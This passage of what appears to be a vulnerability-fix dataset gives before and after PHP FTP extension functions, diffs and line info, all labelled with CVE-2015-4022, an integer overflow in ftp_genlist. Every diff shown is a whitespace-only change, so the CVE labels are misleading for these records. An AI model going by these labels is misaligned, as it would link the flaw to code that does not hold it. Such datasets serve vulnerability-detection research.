        "diff_func": "--- func_before\n+++ func_after\n@@ -17,7 +17,7 @@\n \t\tif (!ftp_getresp(ftp)) {\n \t\t\treturn 0;\n \t\t}\n-\t\t\t\n+\n \t\tif (ftp->resp != 234) {\n \t\t\tif (!ftp_putcmd(ftp, \"AUTH\", \"SSL\")) {\n \t\t\t\treturn 0;\n@@ -25,7 +25,7 @@\n \t\t\tif (!ftp_getresp(ftp)) {\n \t\t\t\treturn 0;\n \t\t\t}\n-\t\t\t\t\n+\n \t\t\tif (ftp->resp != 334) {\n \t\t\t\treturn 0;\n \t\t\t} else {\n@@ -33,7 +33,7 @@\n \t\t\t\tftp->use_ssl_for_data = 1;\n \t\t\t}\n \t\t}\n-\t\t\n+\n \t\tctx = SSL_CTX_new(SSLv23_client_method());\n \t\tif (ctx == NULL) {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"failed to create the SSL context\");\n@@ -80,8 +80,8 @@\n \t\t\tif (!ftp_getresp(ftp)) {\n \t\t\t\treturn 0;\n \t\t\t}\n-\t\t\t\n-\t\t\tftp->use_ssl_for_data = (ftp->resp >= 200 && ftp->resp <=299);\t\t\n+\n+\t\t\tftp->use_ssl_for_data = (ftp->resp >= 200 && ftp->resp <=299);\n \t\t}\n \t}\n #endif",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t",
                "\t\t\t\t",
                "\t\t",
                "\t\t\t",
                "\t\t\tftp->use_ssl_for_data = (ftp->resp >= 200 && ftp->resp <=299);\t\t"
            ],
            "added_lines": [
                "",
                "",
                "",
                "",
                "\t\t\tftp->use_ssl_for_data = (ftp->resp >= 200 && ftp->resp <=299);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_put",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_put(ftpbuf_t *ftp, const char *path, php_stream *instream, ftptype_t type, long startpos TSRMLS_DC)\n{\n\tdatabuf_t\t\t*data = NULL;\n\tlong\t\t\tsize;\n\tchar\t\t\t*ptr;\n\tint\t\t\tch;\n\tchar\t\t\targ[11];\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (!ftp_type(ftp, type)) {\n\t\tgoto bail;\n\t}\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tftp->data = data;\t\n\n\tif (startpos > 0) {\n\t\tsnprintf(arg, sizeof(arg), \"%ld\", startpos);\n\t\tif (!ftp_putcmd(ftp, \"REST\", arg)) {\n\t\t\tgoto bail;\n\t\t}\n\t\tif (!ftp_getresp(ftp) || (ftp->resp != 350)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tif (!ftp_putcmd(ftp, \"STOR\", path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125)) {\n\t\tgoto bail;\n\t}\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\n\tsize = 0;\n\tptr = data->buf;\n\twhile (!php_stream_eof(instream) && (ch = php_stream_getc(instream))!=EOF) {\n\t\t/* flush if necessary */\n\t\tif (FTP_BUFSIZE - size < 2) {\n\t\t\tif (my_send(ftp, data->fd, data->buf, size) != size) {\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tptr = data->buf;\n\t\t\tsize = 0;\n\t\t}\n\n\t\tif (ch == '\\n' && type == FTPTYPE_ASCII) {\n\t\t\t*ptr++ = '\\r';\n\t\t\tsize++;\n\t\t}\n\n\t\t*ptr++ = ch;\n\t\tsize++;\n\t}\n\n\tif (size && my_send(ftp, data->fd, data->buf, size) != size) {\n\t\tgoto bail;\n\t}\n\tftp->data = data = data_close(ftp, data);\n\n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250 && ftp->resp != 200)) {\n\t\tgoto bail;\n\t}\n\treturn 1;\nbail:\n\tftp->data = data_close(ftp, data);\n\treturn 0;\n}",
        "func": "int\nftp_put(ftpbuf_t *ftp, const char *path, php_stream *instream, ftptype_t type, long startpos TSRMLS_DC)\n{\n\tdatabuf_t\t\t*data = NULL;\n\tlong\t\t\tsize;\n\tchar\t\t\t*ptr;\n\tint\t\t\tch;\n\tchar\t\t\targ[11];\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (!ftp_type(ftp, type)) {\n\t\tgoto bail;\n\t}\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tftp->data = data;\n\n\tif (startpos > 0) {\n\t\tsnprintf(arg, sizeof(arg), \"%ld\", startpos);\n\t\tif (!ftp_putcmd(ftp, \"REST\", arg)) {\n\t\t\tgoto bail;\n\t\t}\n\t\tif (!ftp_getresp(ftp) || (ftp->resp != 350)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tif (!ftp_putcmd(ftp, \"STOR\", path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125)) {\n\t\tgoto bail;\n\t}\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\n\tsize = 0;\n\tptr = data->buf;\n\twhile (!php_stream_eof(instream) && (ch = php_stream_getc(instream))!=EOF) {\n\t\t/* flush if necessary */\n\t\tif (FTP_BUFSIZE - size < 2) {\n\t\t\tif (my_send(ftp, data->fd, data->buf, size) != size) {\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tptr = data->buf;\n\t\t\tsize = 0;\n\t\t}\n\n\t\tif (ch == '\\n' && type == FTPTYPE_ASCII) {\n\t\t\t*ptr++ = '\\r';\n\t\t\tsize++;\n\t\t}\n\n\t\t*ptr++ = ch;\n\t\tsize++;\n\t}\n\n\tif (size && my_send(ftp, data->fd, data->buf, size) != size) {\n\t\tgoto bail;\n\t}\n\tftp->data = data = data_close(ftp, data);\n\n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250 && ftp->resp != 200)) {\n\t\tgoto bail;\n\t}\n\treturn 1;\nbail:\n\tftp->data = data_close(ftp, data);\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -16,7 +16,7 @@\n \tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n \t\tgoto bail;\n \t}\n-\tftp->data = data;\t\n+\tftp->data = data;\n \n \tif (startpos > 0) {\n \t\tsnprintf(arg, sizeof(arg), \"%ld\", startpos);",
        "diff_line_info": {
            "deleted_lines": [
                "\tftp->data = data;\t"
            ],
            "added_lines": [
                "\tftp->data = data;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_type",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_type(ftpbuf_t *ftp, ftptype_t type)\n{\n\tchar typechar[2] = \"?\";\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (type == ftp->type) { \n\t\treturn 1;\n\t}\n\tif (type == FTPTYPE_ASCII) {\n\t\ttypechar[0] = 'A';\n\t} else if (type == FTPTYPE_IMAGE) {\n\t\ttypechar[0] = 'I';\n\t} else {\n\t\treturn 0;\n\t}\n\tif (!ftp_putcmd(ftp, \"TYPE\", typechar)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 200) {\n\t\treturn 0;\n\t}\n\tftp->type = type;\n\n\treturn 1;\n}",
        "func": "int\nftp_type(ftpbuf_t *ftp, ftptype_t type)\n{\n\tchar typechar[2] = \"?\";\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (type == ftp->type) {\n\t\treturn 1;\n\t}\n\tif (type == FTPTYPE_ASCII) {\n\t\ttypechar[0] = 'A';\n\t} else if (type == FTPTYPE_IMAGE) {\n\t\ttypechar[0] = 'I';\n\t} else {\n\t\treturn 0;\n\t}\n\tif (!ftp_putcmd(ftp, \"TYPE\", typechar)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 200) {\n\t\treturn 0;\n\t}\n\tftp->type = type;\n\n\treturn 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,7 @@\n \tif (ftp == NULL) {\n \t\treturn 0;\n \t}\n-\tif (type == ftp->type) { \n+\tif (type == ftp->type) {\n \t\treturn 1;\n \t}\n \tif (type == FTPTYPE_ASCII) {",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (type == ftp->type) { "
            ],
            "added_lines": [
                "\tif (type == ftp->type) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_putcmd",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_putcmd(ftpbuf_t *ftp, const char *cmd, const char *args)\n{\n\tint\t\tsize;\n\tchar\t\t*data;\n\n\tif (strpbrk(cmd, \"\\r\\n\")) {\n\t\treturn 0;\n\t} \n\t/* build the output buffer */\n\tif (args && args[0]) {\n\t\t/* \"cmd args\\r\\n\\0\" */\n\t\tif (strlen(cmd) + strlen(args) + 4 > FTP_BUFSIZE) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (strpbrk(args, \"\\r\\n\")) {\n\t\t\treturn 0;\n\t\t}\n\t\tsize = slprintf(ftp->outbuf, sizeof(ftp->outbuf), \"%s %s\\r\\n\", cmd, args);\n\t} else {\n\t\t/* \"cmd\\r\\n\\0\" */\n\t\tif (strlen(cmd) + 3 > FTP_BUFSIZE) {\n\t\t\treturn 0;\n\t\t}\n\t\tsize = slprintf(ftp->outbuf, sizeof(ftp->outbuf), \"%s\\r\\n\", cmd);\n\t}\n\n\tdata = ftp->outbuf;\n\n\t/* Clear the extra-lines buffer */\n\tftp->extra = NULL;\n\n\tif (my_send(ftp, ftp->fd, data, size) != size) {\n\t\treturn 0;\n\t}\n\treturn 1;\n}",
        "func": "int\nftp_putcmd(ftpbuf_t *ftp, const char *cmd, const char *args)\n{\n\tint\t\tsize;\n\tchar\t\t*data;\n\n\tif (strpbrk(cmd, \"\\r\\n\")) {\n\t\treturn 0;\n\t}\n\t/* build the output buffer */\n\tif (args && args[0]) {\n\t\t/* \"cmd args\\r\\n\\0\" */\n\t\tif (strlen(cmd) + strlen(args) + 4 > FTP_BUFSIZE) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (strpbrk(args, \"\\r\\n\")) {\n\t\t\treturn 0;\n\t\t}\n\t\tsize = slprintf(ftp->outbuf, sizeof(ftp->outbuf), \"%s %s\\r\\n\", cmd, args);\n\t} else {\n\t\t/* \"cmd\\r\\n\\0\" */\n\t\tif (strlen(cmd) + 3 > FTP_BUFSIZE) {\n\t\t\treturn 0;\n\t\t}\n\t\tsize = slprintf(ftp->outbuf, sizeof(ftp->outbuf), \"%s\\r\\n\", cmd);\n\t}\n\n\tdata = ftp->outbuf;\n\n\t/* Clear the extra-lines buffer */\n\tftp->extra = NULL;\n\n\tif (my_send(ftp, ftp->fd, data, size) != size) {\n\t\treturn 0;\n\t}\n\treturn 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,7 @@\n \n \tif (strpbrk(cmd, \"\\r\\n\")) {\n \t\treturn 0;\n-\t} \n+\t}\n \t/* build the output buffer */\n \tif (args && args[0]) {\n \t\t/* \"cmd args\\r\\n\\0\" */",
        "diff_line_info": {
            "deleted_lines": [
                "\t} "
            ],
            "added_lines": [
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/data_accept",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "databuf_t*\ndata_accept(databuf_t *data, ftpbuf_t *ftp TSRMLS_DC)\n{\n\tphp_sockaddr_storage addr;\n\tsocklen_t\t\t\tsize;\n\n#if HAVE_OPENSSL_EXT\n\tSSL_CTX\t\t*ctx;\n\tlong ssl_ctx_options = SSL_OP_ALL;\n#endif\n\n\tif (data->fd != -1) {\n\t\tgoto data_accepted;\n\t}\n\tsize = sizeof(addr);\n\tdata->fd = my_accept(ftp, data->listener, (struct sockaddr*) &addr, &size);\n\tclosesocket(data->listener);\n\tdata->listener = -1;\n\n\tif (data->fd == -1) {\n\t\tefree(data);\n\t\treturn NULL;\n\t}\n\ndata_accepted:\n#if HAVE_OPENSSL_EXT\n\t\n\t/* now enable ssl if we need to */\n\tif (ftp->use_ssl && ftp->use_ssl_for_data) {\n\t\tctx = SSL_CTX_new(SSLv23_client_method());\n\t\tif (ctx == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"data_accept: failed to create the SSL context\");\n\t\t\treturn 0;\n\t\t}\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090605fL\n\t\tssl_ctx_options &= ~SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS;\n#endif\n\t\tSSL_CTX_set_options(ctx, ssl_ctx_options);\n\n\t\tdata->ssl_handle = SSL_new(ctx);\n\t\tif (data->ssl_handle == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"data_accept: failed to create the SSL handle\");\n\t\t\tSSL_CTX_free(ctx);\n\t\t\treturn 0;\n\t\t}\n\t\t\t\n\t\t\n\t\tSSL_set_fd(data->ssl_handle, data->fd);\n\n\t\tif (ftp->old_ssl) {\n\t\t\tSSL_copy_session_id(data->ssl_handle, ftp->ssl_handle);\n\t\t}\n\t\t\t\n\t\tif (SSL_connect(data->ssl_handle) <= 0) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"data_accept: SSL/TLS handshake failed\");\n\t\t\tSSL_shutdown(data->ssl_handle);\n\t\t\tSSL_free(data->ssl_handle);\n\t\t\treturn 0;\n\t\t}\n\t\t\t\n\t\tdata->ssl_active = 1;\n\t}\t\n\n#endif\n\n\treturn data;\n}",
        "func": "databuf_t*\ndata_accept(databuf_t *data, ftpbuf_t *ftp TSRMLS_DC)\n{\n\tphp_sockaddr_storage addr;\n\tsocklen_t\t\t\tsize;\n\n#if HAVE_OPENSSL_EXT\n\tSSL_CTX\t\t*ctx;\n\tlong ssl_ctx_options = SSL_OP_ALL;\n#endif\n\n\tif (data->fd != -1) {\n\t\tgoto data_accepted;\n\t}\n\tsize = sizeof(addr);\n\tdata->fd = my_accept(ftp, data->listener, (struct sockaddr*) &addr, &size);\n\tclosesocket(data->listener);\n\tdata->listener = -1;\n\n\tif (data->fd == -1) {\n\t\tefree(data);\n\t\treturn NULL;\n\t}\n\ndata_accepted:\n#if HAVE_OPENSSL_EXT\n\n\t/* now enable ssl if we need to */\n\tif (ftp->use_ssl && ftp->use_ssl_for_data) {\n\t\tctx = SSL_CTX_new(SSLv23_client_method());\n\t\tif (ctx == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"data_accept: failed to create the SSL context\");\n\t\t\treturn 0;\n\t\t}\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090605fL\n\t\tssl_ctx_options &= ~SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS;\n#endif\n\t\tSSL_CTX_set_options(ctx, ssl_ctx_options);\n\n\t\tdata->ssl_handle = SSL_new(ctx);\n\t\tif (data->ssl_handle == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"data_accept: failed to create the SSL handle\");\n\t\t\tSSL_CTX_free(ctx);\n\t\t\treturn 0;\n\t\t}\n\n\n\t\tSSL_set_fd(data->ssl_handle, data->fd);\n\n\t\tif (ftp->old_ssl) {\n\t\t\tSSL_copy_session_id(data->ssl_handle, ftp->ssl_handle);\n\t\t}\n\n\t\tif (SSL_connect(data->ssl_handle) <= 0) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"data_accept: SSL/TLS handshake failed\");\n\t\t\tSSL_shutdown(data->ssl_handle);\n\t\t\tSSL_free(data->ssl_handle);\n\t\t\treturn 0;\n\t\t}\n\n\t\tdata->ssl_active = 1;\n\t}\n\n#endif\n\n\treturn data;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -24,7 +24,7 @@\n \n data_accepted:\n #if HAVE_OPENSSL_EXT\n-\t\n+\n \t/* now enable ssl if we need to */\n \tif (ftp->use_ssl && ftp->use_ssl_for_data) {\n \t\tctx = SSL_CTX_new(SSLv23_client_method());\n@@ -44,23 +44,23 @@\n \t\t\tSSL_CTX_free(ctx);\n \t\t\treturn 0;\n \t\t}\n-\t\t\t\n-\t\t\n+\n+\n \t\tSSL_set_fd(data->ssl_handle, data->fd);\n \n \t\tif (ftp->old_ssl) {\n \t\t\tSSL_copy_session_id(data->ssl_handle, ftp->ssl_handle);\n \t\t}\n-\t\t\t\n+\n \t\tif (SSL_connect(data->ssl_handle) <= 0) {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"data_accept: SSL/TLS handshake failed\");\n \t\t\tSSL_shutdown(data->ssl_handle);\n \t\t\tSSL_free(data->ssl_handle);\n \t\t\treturn 0;\n \t\t}\n-\t\t\t\n+\n \t\tdata->ssl_active = 1;\n-\t}\t\n+\t}\n \n #endif\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t",
                "\t\t\t",
                "\t\t",
                "\t\t\t",
                "\t\t\t",
                "\t}\t"
            ],
            "added_lines": [
                "",
                "",
                "",
                "",
                "",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_chmod",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_chmod(ftpbuf_t *ftp, const int mode, const char *filename, const int filename_len)\n{\n\tchar *buffer;\n\n\tif (ftp == NULL || filename_len <= 0) {\n\t\treturn 0;\n\t}\n\n\tspprintf(&buffer, 0, \"CHMOD %o %s\", mode, filename);\n\n\tif (!ftp_putcmd(ftp, \"SITE\", buffer)) {\n\t\tefree(buffer);\n\t\treturn 0;\n\t}\n\n\tefree(buffer);\n\n\tif (!ftp_getresp(ftp) || ftp->resp != 200) {\n\t\treturn 0;\n\t}\n\t\n\treturn 1;\n}",
        "func": "int\nftp_chmod(ftpbuf_t *ftp, const int mode, const char *filename, const int filename_len)\n{\n\tchar *buffer;\n\n\tif (ftp == NULL || filename_len <= 0) {\n\t\treturn 0;\n\t}\n\n\tspprintf(&buffer, 0, \"CHMOD %o %s\", mode, filename);\n\n\tif (!ftp_putcmd(ftp, \"SITE\", buffer)) {\n\t\tefree(buffer);\n\t\treturn 0;\n\t}\n\n\tefree(buffer);\n\n\tif (!ftp_getresp(ftp) || ftp->resp != 200) {\n\t\treturn 0;\n\t}\n\n\treturn 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -19,6 +19,6 @@\n \tif (!ftp_getresp(ftp) || ftp->resp != 200) {\n \t\treturn 0;\n \t}\n-\t\n+\n \treturn 1;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\t"
            ],
            "added_lines": [
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_syst",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "const char*\nftp_syst(ftpbuf_t *ftp)\n{\n\tchar *syst, *end;\n\n\tif (ftp == NULL) {\n\t\treturn NULL;\n\t}\n\n\t/* default to cached value */\n\tif (ftp->syst) {\n\t\treturn ftp->syst;\n\t}\n\tif (!ftp_putcmd(ftp, \"SYST\", NULL)) {\n\t\treturn NULL;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 215) { \n\t\treturn NULL;\n\t}\n\tsyst = ftp->inbuf;\n\twhile (*syst == ' ') {\n\t\tsyst++;\n\t}\n\tif ((end = strchr(syst, ' '))) {\n\t\t*end = 0;\n\t}\n\tftp->syst = estrdup(syst);\n\tif (end) {\n\t\t*end = ' ';\n\t}\n\treturn ftp->syst;\n}",
        "func": "const char*\nftp_syst(ftpbuf_t *ftp)\n{\n\tchar *syst, *end;\n\n\tif (ftp == NULL) {\n\t\treturn NULL;\n\t}\n\n\t/* default to cached value */\n\tif (ftp->syst) {\n\t\treturn ftp->syst;\n\t}\n\tif (!ftp_putcmd(ftp, \"SYST\", NULL)) {\n\t\treturn NULL;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 215) {\n\t\treturn NULL;\n\t}\n\tsyst = ftp->inbuf;\n\twhile (*syst == ' ') {\n\t\tsyst++;\n\t}\n\tif ((end = strchr(syst, ' '))) {\n\t\t*end = 0;\n\t}\n\tftp->syst = estrdup(syst);\n\tif (end) {\n\t\t*end = ' ';\n\t}\n\treturn ftp->syst;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,7 +14,7 @@\n \tif (!ftp_putcmd(ftp, \"SYST\", NULL)) {\n \t\treturn NULL;\n \t}\n-\tif (!ftp_getresp(ftp) || ftp->resp != 215) { \n+\tif (!ftp_getresp(ftp) || ftp->resp != 215) {\n \t\treturn NULL;\n \t}\n \tsyst = ftp->inbuf;",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (!ftp_getresp(ftp) || ftp->resp != 215) { "
            ],
            "added_lines": [
                "\tif (!ftp_getresp(ftp) || ftp->resp != 215) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/my_recv",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nmy_recv(ftpbuf_t *ftp, php_socket_t s, void *buf, size_t len)\n{\n\tint\t\tn, nr_bytes;\n\n\tn = php_pollfd_for_ms(s, PHP_POLLREADABLE, ftp->timeout_sec * 1000);\n\tif (n < 1) {\n#if !defined(PHP_WIN32) && !(defined(NETWARE) && defined(USE_WINSOCK))\n\t\tif (n == 0) {\n\t\t\terrno = ETIMEDOUT;\n\t\t}\n#endif\n\t\treturn -1;\n\t}\n\n#if HAVE_OPENSSL_EXT\n\tif (ftp->use_ssl && ftp->fd == s && ftp->ssl_active) {\n\t\tnr_bytes = SSL_read(ftp->ssl_handle, buf, len);\n\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\t\n\t\tnr_bytes = SSL_read(ftp->data->ssl_handle, buf, len);\n\t} else {\n#endif\n\t\tnr_bytes = recv(s, buf, len, 0);\n#if HAVE_OPENSSL_EXT\n\t}\n#endif\t\n\treturn (nr_bytes);\n}",
        "func": "int\nmy_recv(ftpbuf_t *ftp, php_socket_t s, void *buf, size_t len)\n{\n\tint\t\tn, nr_bytes;\n\n\tn = php_pollfd_for_ms(s, PHP_POLLREADABLE, ftp->timeout_sec * 1000);\n\tif (n < 1) {\n#if !defined(PHP_WIN32) && !(defined(NETWARE) && defined(USE_WINSOCK))\n\t\tif (n == 0) {\n\t\t\terrno = ETIMEDOUT;\n\t\t}\n#endif\n\t\treturn -1;\n\t}\n\n#if HAVE_OPENSSL_EXT\n\tif (ftp->use_ssl && ftp->fd == s && ftp->ssl_active) {\n\t\tnr_bytes = SSL_read(ftp->ssl_handle, buf, len);\n\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\n\t\tnr_bytes = SSL_read(ftp->data->ssl_handle, buf, len);\n\t} else {\n#endif\n\t\tnr_bytes = recv(s, buf, len, 0);\n#if HAVE_OPENSSL_EXT\n\t}\n#endif\n\treturn (nr_bytes);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -16,13 +16,13 @@\n #if HAVE_OPENSSL_EXT\n \tif (ftp->use_ssl && ftp->fd == s && ftp->ssl_active) {\n \t\tnr_bytes = SSL_read(ftp->ssl_handle, buf, len);\n-\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\t\n+\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\n \t\tnr_bytes = SSL_read(ftp->data->ssl_handle, buf, len);\n \t} else {\n #endif\n \t\tnr_bytes = recv(s, buf, len, 0);\n #if HAVE_OPENSSL_EXT\n \t}\n-#endif\t\n+#endif\n \treturn (nr_bytes);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {\t",
                "#endif\t"
            ],
            "added_lines": [
                "\t} else if (ftp->use_ssl && ftp->fd != s && ftp->use_ssl_for_data && ftp->data->ssl_active) {",
                "#endif"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_pasv",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_pasv(ftpbuf_t *ftp, int pasv)\n{\n\tchar\t\t\t*ptr;\n\tunion ipbox\t\tipbox;\n\tunsigned long\t\tb[6];\n\tsocklen_t\t\t\tn;\n\tstruct sockaddr *sa;\n\tstruct sockaddr_in *sin;\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (pasv && ftp->pasv == 2) {\n\t\treturn 1;\n\t}\n\tftp->pasv = 0;\n\tif (!pasv) {\n\t\treturn 1;\n\t}\n\tn = sizeof(ftp->pasvaddr);\n\tmemset(&ftp->pasvaddr, 0, n);\n\tsa = (struct sockaddr *) &ftp->pasvaddr;\n\n#if HAVE_IPV6\n\tif (getpeername(ftp->fd, sa, &n) < 0) {\n\t\treturn 0;\n\t}\n\tif (sa->sa_family == AF_INET6) {\n\t\tstruct sockaddr_in6 *sin6 = (struct sockaddr_in6 *) sa;\n\t\tchar *endptr, delimiter;\n\n\t\t/* try EPSV first */\n\t\tif (!ftp_putcmd(ftp, \"EPSV\", NULL)) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (!ftp_getresp(ftp)) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (ftp->resp == 229) {\n\t\t\t/* parse out the port */\n\t\t\tfor (ptr = ftp->inbuf; *ptr && *ptr != '('; ptr++);\n\t\t\tif (!*ptr) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tdelimiter = *++ptr;\n\t\t\tfor (n = 0; *ptr && n < 3; ptr++) {\n\t\t\t\tif (*ptr == delimiter) {\n\t\t\t\t\tn++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tsin6->sin6_port = htons((unsigned short) strtoul(ptr, &endptr, 10));\n\t\t\tif (ptr == endptr || *endptr != delimiter) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tftp->pasv = 2;\n\t\t\treturn 1;\n\t\t}\n\t}\n\n\t/* fall back to PASV */\n#endif\n\n\tif (!ftp_putcmd(ftp, \"PASV\", NULL)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 227) { \n\t\treturn 0;\n\t}\n\t/* parse out the IP and port 